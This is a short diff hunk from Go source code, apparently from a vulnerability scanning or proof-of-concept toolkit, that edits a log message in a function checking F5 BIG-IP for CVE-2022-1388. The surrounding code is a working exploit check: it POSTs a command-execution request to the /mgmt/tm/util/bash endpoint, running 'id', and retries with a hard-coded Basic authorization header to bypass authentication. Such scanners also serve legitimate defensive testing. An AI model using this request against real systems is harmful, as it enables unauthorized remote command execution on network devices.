@@ -17,13 +17,13 @@ func CVE_2022_1388(u string) bool {
 	data := "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
 	if req, err := pkg.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header1); err == nil {
 		if req.StatusCode == 200 && strings.Contains(req.Body, "commandResult") {
-			pkg.GoPocLog(fmt.Sprintf("Found F5 BIG-IP Tomcat CVE_2022_1388|--\"%s\"\n", u))
+			pkg.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2022_1388|--\"%s\"\n", u))
 			return true
 		} else {
 			header1["Authorization"] = "Basic ZjVodWJibGVsY2RhZG1pbjo="
 			if req, err := pkg.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header1); err == nil {
 				if req.StatusCode == 200 && strings.Contains(req.Body, "commandResult") {
-					pkg.GoPocLog(fmt.Sprintf("Found F5 BIG-IP Tomcat CVE_2022_1388|--\"%s\"\n", u))
+					pkg.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2022_1388|--\"%s\"\n", u))
 					return true
 				}
 			} else {
